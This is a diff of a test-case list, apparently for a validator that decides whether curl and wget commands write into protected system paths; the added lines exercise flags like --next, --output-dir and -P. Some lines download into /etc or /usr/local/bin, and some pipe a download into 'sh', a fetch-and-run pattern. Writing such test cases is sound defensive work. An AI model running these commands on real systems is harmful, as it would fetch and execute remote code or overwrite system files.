@@ -1151,6 +1151,7 @@ wget -O /dev/null https://archive.example/x
 wget --output-document=/dev/null https://archive.example/x
 wget -o /dev/null -O /dev/null https://archive.example/x
 cd /etc && wget -O /dev/null https://archive.example/x
+wget -P /etc -O /dev/null https://archive.example/x
 curl -s https://lookup.example > out.html
 curl -s https://lookup.example > '$dir/data/t1/page.html'
 curl -s https://lookup.example | cat > '$dir/data/t1/cat.html'
@@ -1269,6 +1270,8 @@ cd /etc && wget -a /dev/null https://archive.example/payload
 cd /etc && wget --append-output=/dev/null https://archive.example/payload
 curl --output-dir /etc -o /dev/null https://lookup.example/x
 curl --create-dirs --output-dir /etc -o /dev/null https://lookup.example/x && sh /etc/dev/null
+curl --create-dirs --output-dir /etc -o /dev/null https://lookup.example/x --next -o /dev/null https://lookup.example/y && sh /etc/dev/null
+curl -o /dev/null https://lookup.example/x --next --output-dir /etc -o /dev/null https://lookup.example/y
 curl -o /usr/local/bin/tool https://lookup.example/x
 curl -s https://lookup.example/x > /etc/page.html
 curl --output-dir /etc -O https://archive.example/x
